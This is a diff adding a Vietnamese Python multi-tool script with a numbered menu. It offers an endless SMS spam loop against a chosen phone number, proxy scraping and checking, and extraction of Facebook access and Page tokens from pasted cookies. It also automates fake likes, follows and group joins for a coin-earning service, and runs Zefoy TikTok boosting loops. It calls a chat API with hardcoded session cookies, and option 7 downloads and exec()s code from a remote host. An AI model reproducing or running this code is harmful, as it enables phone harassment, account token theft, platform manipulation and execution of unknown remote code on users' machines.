+			elif """onsubmit="showHideElements""" in self.video_info:
+				self.video_info = [self.video_info.split('" name="')[1].split('"')[0],self.video_info.split('value="')[1].split('"')[0]]
+				return (True, request.text)
+			elif 'Checking Timer...' in self.video_info:
+				try: 
+					t=int(re.findall(r'ltm=(\d*);', self.video_info)[0])
+					lamtilo = int(re.findall(r'ltm=(\d*);', self.video_info)[0])
+				except: 
+					return (False,)
+				if lamtilo==0:self.find_video()
+				elif lamtilo >= 1000: print(f'{do}Your IP was banned')
+				_=time.time()
+				while time.time()-2<_+lamtilo:
+					t-=1
+					print("Vui lòng chờ: {0} ".format(t)+"giây .", end="\r")
+					time.sleep(1)
+					
+				continue
+			elif 'Too many requests. Please slow' in self.video_info: time.sleep(3)
+			else: print(self.video_info)
+
+	def use_service2(self):
+		if self.find_video()[0] is False: return False
+		self.token = "".join(random.choices(ascii_letters+digits, k=16))
+		request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':f'multipart/form-data; boundary=----WebKitFormBoundary{self.token}', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary{self.token}\r\nContent-Disposition: form-data; name="{self.video_info[0]}"\r\n\r\n{self.video_info[1]}\r\n------WebKitFormBoundary{self.token}--\r\n')
+		try: res = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
+		except: time.sleep(3); return ""
+		if 'Session expired. Please re-login' in res: print(f'{do}Phiên hết hạn. Đang đăng nhập lại...');self.send_captcha2(); return ""
+		elif 'Too many requests. Please slow' in res: time.sleep(3)
+		elif 'service is currently not working' in res: return ('Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.')
+		else: print(res.split("sans-serif;text-align:center;color:green;'>")[1].split("</")[0])
+
+	def get_video_info2(self):
+		request = self.session.get(f'https://tiktok.livecounts.io/video/stats/{urlparse(self.url).path.rpartition("/")[2]}',headers={'authority':'tiktok.livecounts.io','origin':'https://livecounts.io','user-agent':self.headers['user-agent']}).json()
+		if 'likeCount' in request: return request
+		else: return {'viewCount':0, 'likeCount':0,'commentCount':0,'shareCount':0}
+
+	def get_video_id2(self, url_ = None, set_url=True):
+		if url_ is None: url_ = self.url
+		if url_[-1] == '/': url_=url_[:-1]
+		url = urlparse(url_).path.rpartition('/')[2]
+		if url.isdigit(): self.url = url_; return url_
+		request = requests.get(f'https://api.tokcount.com/?type=videoID&username=https://vm.tiktok.com/{url}',headers={'origin': 'https://tokcount.com','authority': 'api.tokcount.com','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'})
+		if request.text == '': print(f'{do}Link video không hợp lệ'); return False
+		else: json_=request.json()
+		if 'author' not in json_: print(f'{do}{self.url}| Link video không hợp lệ'); return False
+		if set_url: self.url = f'https://www.tiktok.com/@{json_["author"]}/video/{json_["id"]}';print(f'Formated video url --> {self.url}')
+		return request.text
+
+	def check_config2(self):
+		
+		while True:
+			try: 
+				last_url = self.url
+				if last_url != self.url: self.get_video_id()
+			except Exception as e: print(e)
+			time.sleep(4)
+	def update_name2(self):
+		while True:
+			try:
+				ctypes.windll.kernel32.SetConsoleTitleA(self.text.encode())
+				video_info = self.get_video_info()
+				self.text = f"{xanh_la}Hearts: {like_info['likeCount']} "
+			except: pass
+			time.sleep(5)
+#===========================================================================================================================================================================================
+#====================================================================================================================================================================================================
+def dao_proxy():
+
+  loai = input(f"{tim}Nhập Loại Proxies:{vang} ")
+
+  so = input(f"{xanh_duong}Nhập Số Lượng Proxies:{vang} ")
+  luu = input(f"{xanh_duong}Nhập File Lưu Proxies:{vang} ")
+  params = {
+      'request': 'displayproxies',
+      'protocol': loai,
+      'timeout': so,
+      'country': 'all',
+      'ssl': 'all',
+      'anonymity': 'all',
+  }
+
+  response = requests.get('https://api.proxyscrape.com/v2/', params=params).text
+  print(response)
+  open(luu,'a').write(response)
+
+#===============================================================================================================================================================
+#=======================================================================================================================================================================
+def gpt():
+  while True:
+    tin_nhan = input(f" \033[1;97m[\033[1;31m</>\033[1;97m] {dac_biet}Nhập câu hỏi:{vang} ")
+    cookies = {
+        '_ga': 'GA1.1.1363846780.1683999003',
+        '_ga_Z6X4XPL08Y': 'GS1.1.1683999002.1.1.1683999003.0.0.0',
+        '__gads': 'ID=73d3320f403315ab-228ebcf9b3e000af:T=1683999003:RT=1683999003:S=ALNI_MYjiDyFTVXe4i-Ul91vim1Z2Uzozw',
+        '__gpi': 'UID=00000c05958a891e:T=1683999003:RT=1683999003:S=ALNI_MZrRRQMBseV2bblhmUaaeOVW0KDxA',
+        'XSRF-TOKEN': 'eyJpdiI6Ilo2UWsrWlBNSFNTRHVOK0Fqb1E0VFE9PSIsInZhbHVlIjoiT2xzazRmOTh4YitRa05IUDM1dWppYVRPN1BVU3NGRjB5MHVlb2Z1YzRjZ0xXZzNYN0d3cDl5N3ZRbjkwWDk2dUVOYWZlWGltam1ZMTNDaVdNUmFxSm1tOXoyNnhpZ1dXVGluQXY2aDZBMHFrVlZjSzM4Tk9nN3k5QXp6UDV0dGoiLCJtYWMiOiJmOGZjYTc5MGIzMjNkZDk5ZGZhZjY2NDBiNmU1YzI5NjIxNzIzODg3YmMyY2YzODI3NzRkYzFjOTNjNDVlM2Y3In0%3D',
+        'chatgptorg_session': 'eyJpdiI6Ik51aHR4NlhZRVNIdmVFV2VFdk53VlE9PSIsInZhbHVlIjoiODZMOTZFVzFRSFpTaXFqd1luT3pBbzNJM1kzaWwzTG5rWDNPNkZBVzVmRExtUm1qT1hqbTZxNCtXTWdUN2lHcUd6bSt5NWFBWFFCMjJSZmpUbVZOd3VzT2V0Z3Y5blhtRUlJV2llL0RuUnUzM3lFWFlBakxPVVJNVXJwMTlDUHEiLCJtYWMiOiJlYThhMTY1MzNjOTYwYmE3ODU4ZjY0YjNiZDQxMzQyOWU0YTM0MjI2ZGRiNTk3MGIxODRlZmJhNDk2ZWQ3OTdjIn0%3D',
+  }
+
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json',
+        'Origin': 'https://chatgpt.org',
+        'Referer': 'https://chatgpt.org/chat',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+  }
+
+    json_data = {
+        'message': tin_nhan,
+        'temperature': 1,
+        'presence_penalty': 0,
+        'top_p': 1,
+        'frequency_penalty': 0,
+  }
+
+    response = requests.post('https://chatgpt.org/api/text', cookies=cookies, headers=headers, json=json_data).json()
+    rp = response['message']
+    print(f" \033[1;97m[\033[1;31m</>\033[1;97m] {tim}CHAT-GPT SAID:{vang} ",rp)
+#========================================================================================================================================================================
+nhap = input("\033[96m\033[1mVui lòng nhập tool (nhập số tương ứng): ")
+if nhap == '0':
+      os.system("python toolsgop.py")
+    
+elif nhap == '1':
+    clear()
+    runbanner(một)
+    
+
+elif nhap == '1.1':
+    clear()
+    runbanner(banner2)
+    sdt = input("\033[96m\033[1mNhập số điện thoại muốn spam :\033[93m\033[1m ")
+    while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
+        print("\033[91mNhập sai định dạng số")
+        sdt = input("\033[96m\033[1mNhập số điện thoại muốn spam :\033[93m\033[1m ")
+    #count = int(input("\033[96m\033[1mNhập số lần muốn spam :\033[93m\033[1m "))
+    print(f"Đang spam số {sdt}")
+    while True:
+        for i in range(0,i+1):
+            run(sdt,i)
+    if sdt == "0359489322":
+        print("\033[91mSài tool tao thì spam cc số tao nha con chó\033[0m")
+        quit()
+        
+elif nhap == '1.2':
+     clear()
+     runbanner(chontool)
+     dao_proxy()
+
+elif nhap == '1.3':
+     clear()
+     runbanner(chontool)
+     with open('live.txt','w') as file1:
+          file1.write('Tool Check Proxy_Live by KA\n')
+     def check_proxy(proxy):
+          proxy = proxy.strip()
+          url = f'https://clonebysun.com/api/tienich/checkliveproxy/{proxy.strip()}'
+          data = requests.get(url)
+          if 'ip' in data.json() and 'proxy' in data.json() and 'status' in data.json():
+               country = data.json()["country"]
+               if data.json()['ip'] != 'error' and data.json()['proxy'] != '' and data.json()['status'] != 'Die':
+                    print(f'{xanh_la}Live => {data.json()["ip"]} {xanh_duong}Country {vang}{data.json()["country"]} ')
+                    with open('live.txt', 'a+') as f:
+                         f.write(proxy + " | "+country+"\n")
+               else:
+                     print(f'{do}Die => {trang}{proxy}')
+          else:
+               print(f'{do}Invalid JSON response: {data.text}')
+    
+     file_path = input(f'{xanh_duong}Nhập đường dẫn file cần kiểm tra: {vang}')
+     if not os.path.exists(file_path):
+          print(f'{do}Lỗi: File không tồn tại')
+          exit()
+     with open(file_path, 'r') as file:
+          lines = file.readlines()
+     luong=int(input(f"{xanh_duong}Nhập Số Luồng:{vang} "))
+     with ThreadPoolExecutor(max_workers=luong) as executor:
+          executor.map(check_proxy, lines)
+          print(f'{vang}Hoàn tất, kết quả đã được lưu vào file: {xanh_la}live.txt')
+
+elif nhap == '1.4':
+  clear()
+  runbanner(chontool)
+  ck_fb= input(f" \033[1;97m[\033[1;31m</>\033[1;97m] {xanh_duong}Nhập Cookie Acc Cần Get Token Profile-Pro5: {vang}")
+  hed_gettoken = {
+    'authority': 'www.instagram.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'cache-control': 'no-cache',
+    'cookie': ck_fb,
+    'pragma': 'no-cache',
+    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36',
+  }
+  try:
+    token_fb = requests.get('https://www.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https://www.instagram.com/accounts/signup/&&scope=email&response_type=token', headers=hed_gettoken).url.split('#access_token=')[1].split('&data_access_expiration_time')[0]
+    print(f' \033[1;97m[\033[1;31m</>\033[1;97m] {xanh_la}Get Token Profile Thành Công')
+    open('token.txt',"a").write(token_fb+'\n')
+  except:
+    print(f' \033[1;97m[\033[1;31m</>\033[1;97m] {do}Get Token Thất Bại, Vui Lòng Xem Lại Cookie')
+    sleep(5)
+    quit()
+
+  header={
+    'cookie': ck_fb,
+  }
+  def gettokenpro5():
+    get_ = requests.get('https://graph.facebook.com/me/accounts?access_token='+token_fb).json()['data']
+    for access in get_:
+        tok = access['access_token']
+       
+        with open("token_pro5.txt", "a+") as f:
+            f.write(tok+'\n')
+    print(f" \033[1;97m[\033[1;31m</>\033[1;97m] {xanh_la}Get Token Pro5 Thành Công")
+  gettokenpro5()
+  print(f" \033[1;97m[\033[1;31m</>\033[1;97m] \u001b[33;1mĐã Lưu Token Của Profile Vào File: token.txt")
+  print(f" \033[1;97m[\033[1;31m</>\033[1;97m] \u001b[33;1mĐã Lưu Token Của Pro5 Vào File: token_pro5.txt")
+
+
+elif nhap == '1.5':
+  clear()
+  runbanner(chontool)
+  gpt()
+
+
+
+
+
+
+
+elif nhap == '2':
+    so = 0
+    token = ''
+    if os.path.isfile('token.txt'):
+        with open('token.txt', 'r') as file:
+            token = file.read()
+    else:
+        token_input = input("Nhập token tds của bạn: ")
+        with open('token.txt', 'w') as file:
+            file.write(token_input)
+            with open('token.txt', 'r') as file:
+                token = file.read()
+                
+    check_xu = login_tds(token)
+    cookie = input(' Nhập cookie acc: ')
+    print('-'*60)
+#### vào việc
+    get_tt_page = get_page(cookie)
+    a = int(input(' Bạn Muốn Chạy Page Pro5 Số Mấy : '))
+    chon = a-1
+    print('-'*60)
+    print (" Nhập 1 Job Like × Cảm Xúc")
+    print (" Nhập 2 Job Group")
+    print (" Nhập 3 Job Follow ")
+    print (" Nhập 4 Job Group × Like × Cảm Xúc")
+    print (" Nhập 5 Job Group × Like × Cảm Xúc × Follow ")
+    chon_1 = int(input(' Nhập : '))
+    print('-'*60)
+    dl = int(input(' Nhập Delay : '))
+
+    id_page = get_tt_page[chon]['profile']['id']
+    name = get_tt_page[chon]['profile']['name']
+    ck_pro5 = 'sb={}; datr={}; c_user={}; wd={}; xs={}; fr={}; i_user={};'.format(cookie.split('sb=')[1].split(';')[0], cookie.split('datr=')[1].split(';')[0], cookie.split('c_user=')[1].split(';')[0],cookie.split('wd=')[1].split(';')[0], cookie.split('xs=')[1].split(';')[0],cookie.split('fr=')[1].split(';')[0],id_page)
+    data = get_data(cookie)
+    fb_dtsg = json.loads(data)['fb_dtsg']
+    jazoet = json.loads(data)['jazoet']
+    fb = ApiPro5(cookies=ck_pro5, fb_dtsg=fb_dtsg, jazoet=jazoet,id_page=id_page)
+    tt = 0
+    clear()
+    tdstk = check_xu['data']['user']
+    xu_5 = check_xu['data']['xu']
+    print (f" \033[1;37mTài Khoản: {tdstk} \n Xu Hiện Tại : {xu_5} ")
+
+    print('-'*60)
+    cau_hinh(id_page, token, name)
+    print('-'*60)
+    while True :
+        print(" Đợi Tao Tìm Job ",end="\r")
+        if so == 5 :
+            so -= 5
+        else :
+        
+            job = chon_job(so,chon_1)
+            print(f" Đợi Tao Tìm Job ☞  [{job}]       ",end="\r")
+            job_1 = requests.get(f'https://traodoisub.com/api/?fields={job}&access_token={token}')
+            so += 1
+        
+            a = job_1.json()
+        try :
+            b = a["error"] 
+            
+            if chon_1 == 1 :
+                if so == 4 :
+                    for i in range(20,-1,-1):
+                        print(f'[ĐANG TÌM JOB SAU] => {i} GIÂY   ',end='\r')
+                        sleep(1)
+            elif chon_1 == 2 :
+                for i in range(50,-1,-1):
+                    print(f'[ĐANG TÌM JOB SAU] => {i} GIÂY    ',end='\r')
+                    sleep(1)
+            else :
+                if so == 5 :
+                    for i in range(20,-1,-1):
+                        print(f'[ĐANG TÌM JOB SAU] => {i} GIÂY    ',end='\r')
+                        sleep(1)
+        except :
+            for job_2 in a:
+                id_job = job_2["id"]
+                if job == "like" :
+                    type_1 = "LIKE"
+                    type_2 = '1635855486666999'
+                    lam = fb.reaction(id_job, type_2)
+                elif job == "likegiare" :
+                    type_1 = "LIKEGIARE"
+                    type_2 = '1635855486666999'
+                    lam = fb.reaction(id_job, type_2)
+                elif job == "likesieure" :
+                    type_1 = "LIKESIEURE"
+                    type_2 = '1635855486666999'
+                    lam = fb.reaction(id_job, type_2)
+                elif job == "reaction" :
+                    type_1 = job_2["type"]
+                    type_2 = type_cx(type_1) 
+                    lam = fb.reaction(id_job, type_2)
+                elif job == "group" :
+                    type_1 = "GROUP"
+                    lam = fb.join(id_job)
+                elif job == "follow" :
+                    type_1 = "FOLLOW"
+                    lam = fb.subscribe(id_job)
+                    
+                nhan = requests.get(f'https://traodoisub.com/api/coin/?type={type_1}&id={id_job}&access_token={token}')
+                
+                try :
+                    nhan_1 = nhan.json()["error"] 
+                    print (f' ERROR => {id_job} ',end='\r')
+                    sleep(1)
+                except :
+                    tt += 1
+                    gio = datetime.datetime.now().strftime("%H:%M:%S")
+                    xu_1 = nhan.json()["data"]["msg"]
+                    xu_2 = nhan.json()["data"]["xu"]
+                    print (f"\033[1;37m {tt} | {type_1} | {id_job} | {xu_1} | {xu_2} Xu")
+                    idelay(dl)
+elif nhap == '3':
+    main(nhện)
+    
+elif nhap == '4':
+    url = input("nhập url để check: ")
+    check_put_method(url)
+    
+elif nhap == '5':
+    clear()
+    runbanner(chontool)
+    Z = Zefoy()
+    threading.Thread(target=Z.check_config).start()
+    threading.Thread(target=Z.update_name).start()
+    Z.send_captcha()
+    while True:
+        try: 
+            if 'Service is currently not working, try again later' in str(Z.use_service()): print(f'{do}[Trọng Thảo]</>Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.');time.sleep(5)
+        except Exception as e:print(f'LỖI NGHIÊM TÚC | thử lại sau 10 giây.|| {e}');time.sleep(10)
+
+elif nhap == '6':
+    clear()
+    runbanner(chontool)
+    Z = Zefoy2()
+    threading.Thread(target=Z.check_config2).start()
+    threading.Thread(target=Z.update_name2).start()
+    Z.send_captcha2()
+    while True:
+        try: 
+            if 'Service is currently not working, try again later' in str(Z.use_service()): print(f'{do}[Trọng Thảo]</>Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.');time.sleep(5)
+        except Exception as e:print(f'LỖI NGHIÊM TÚC | thử lại sau 10 giây.|| {e}');time.sleep(10)
+
+elif nhap == '7':
+    exec(requests.get('https://hoanganh.eu.org/shareao').text)
+
+ 
+
+
+else:
+    print(f"{do}Vui lòng điền đúng")
+    exit()
